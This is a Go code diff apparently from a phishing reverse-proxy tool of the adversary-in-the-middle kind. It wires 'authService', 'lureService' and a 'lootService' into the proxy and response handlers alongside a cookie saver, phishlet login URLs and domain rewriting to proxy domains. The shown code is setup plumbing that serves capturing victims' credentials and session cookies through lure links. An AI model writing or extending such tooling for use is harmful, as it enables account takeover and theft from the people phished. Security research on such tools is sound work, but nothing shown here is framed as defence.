@@ -61,7 +61,7 @@ func setupRequestProcessor(conv DomainConverter) RequestProcessor {
 }
 
 func setupResponseProcessor(conf *appConfig, conv DomainConverter,
-	cookieSaver CookieSaver) ResponseProcessor {
+	cookieSaver CookieSaver, authService AuthService, lureService LureService) ResponseProcessor {
 	baseScript := fmt.Sprintf(`
 	var baseDomain = "%s"
 	var apiURL = "https://%s"`, conf.DomainNameWithPort, conf.APIHostname)
@@ -72,13 +72,14 @@ func setupResponseProcessor(conf *appConfig, conv DomainConverter,
 	responseURLProc := newURLRegexProcessor(func(domain string) string {
 		return conv.ToProxyDomain(domain)
 	})
-	return NewResponseProcessor(conv, responseURLProc, htmlProc, cookieSaver)
+	return NewResponseProcessor(conv, responseURLProc, htmlProc, cookieSaver, authService, lureService)
 }
 
-func setupProxyHandler(conf *appConfig, conv DomainConverter, cookieSaver CookieSaver) fiber.Handler {
+func setupProxyHandler(conf *appConfig, conv DomainConverter,
+	cookieSaver CookieSaver, authService AuthService, lureService LureService) fiber.Handler {
 	client := setupHTTPClient()
 	req := setupRequestProcessor(conv)
-	resp := setupResponseProcessor(conf, conv, cookieSaver)
+	resp := setupResponseProcessor(conf, conv, cookieSaver, authService, lureService)
 	return NewProxyHandler(client, req, resp)
 }
 
@@ -101,6 +102,7 @@ func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureSer
 		InvalidAuthURL: conf.Phishlet.InvalidAuthURL,
 		LoginURL:       conv.ToProxyURL(conf.Phishlet.LoginURL),
 		LureService:    lureService,
+		AuthService:    lootService,
 	})
 }
 
@@ -194,7 +196,7 @@ func main() {
 		LureService:     lureService,
 		CookieSaver:     cookieSaver,
 	})
-	proxy := setupProxyHandler(conf, conv, cookieSaver)
+	proxy := setupProxyHandler(conf, conv, cookieSaver, lootService, lureService)
 
 	app := setupApp(api, auth, proxy)
 	if err := app.ListenTLS(conf.ListenAddr, conf.TLSCert, conf.TLSKey); err != nil {
